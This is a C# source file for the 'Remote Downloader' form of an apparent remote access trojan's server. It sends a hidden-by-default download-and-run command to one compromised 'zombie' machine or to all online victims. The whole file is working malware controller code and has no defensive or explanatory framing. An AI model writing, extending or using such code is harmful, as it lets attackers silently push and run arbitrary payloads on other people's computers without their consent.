using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CCSURAT_Server.ControlForms
{
    public partial class RemoteDownloader : Form
    {
        Zombie zombie;
        List<Zombie> zombies;
        public RemoteDownloader(Zombie zombie)
        {
            InitializeComponent();
            this.zombie = zombie;
            hiddenRadioButton.Checked = true;
            this.Text = zombie.IP + " - " + zombie.computerName + " - Remote Downloader";
        }

        // Seperate constructer to allow opening a single downloader for all online clients
        // Good for updating client executable.
        public RemoteDownloader(List<Zombie> zombies)
        {
            InitializeComponent();
            this.zombies = zombies;
            hiddenRadioButton.Checked = true;
            this.Text = "ALL ONLINE CLIENTS - Remote Downloader";
        }

        private void downloadButton_Click(object sender, EventArgs e)
        {
            string type;
            if (hiddenRadioButton.Checked)
                type = "HIDDEN";
            else
                type = "VISIBLE";

            if (zombie != null)
                zombie.SendData("[[DOWNLOADRUN]]" + urlTextbox.Text + "|*|" + type + "[[/DOWNLOADRUN]]");
            else
                foreach (Zombie z in zombies)
                    z.SendData("[[DOWNLOADRUN]]" + urlTextbox.Text + "|*|" + type + "[[/DOWNLOADRUN]]");
        }

        private void visibleRadioButton_CheckedChanged(object sender, EventArgs e)
        {
            hiddenRadioButton.Checked = !visibleRadioButton.Checked;
        }

        private void hiddenRadioButton_CheckedChanged(object sender, EventArgs e)
        {
            visibleRadioButton.Checked = !hiddenRadioButton.Checked;
        }
    }
}
